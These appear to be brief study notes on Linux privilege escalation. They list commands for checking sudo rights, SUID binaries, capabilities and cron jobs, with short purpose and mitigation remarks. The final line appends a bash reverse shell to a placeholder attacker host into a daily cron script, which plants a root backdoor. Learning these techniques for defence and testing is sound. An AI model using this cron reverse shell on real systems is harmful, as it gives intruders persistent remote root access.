# Check programs the user can run as root
<pre>sudo -l</pre>

# Check file permisions
<pre>ls -la</pre>

# Check programs with SUID bit set
<pre>find / -type f -perm -04000 -ls 2>/dev/null </pre>
**Mitigation: check often for suid files and remove it where not needed also limit file access and monitor system changes.
** Purpose: Admin sets suid bit on a program so a normal user runs these application with higher privilege 


# Get a list of of application that has capabilities
getcap -r / 2>/dev/null
** Purpose: Let programs run only with the specific powers they need, instead of full root access.
** Mitigation: Follow least privilege, review assigned capabilities and drop unnecesssary ones

# Cron jobs --> : Scheduled tasks in Linux that run automatically at set times. Runs with the privilege of their owners and not current user

<pre> ls -la /etc/cron*</pre> 
<pre>echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> /etc/cron.daily/backup</pre>
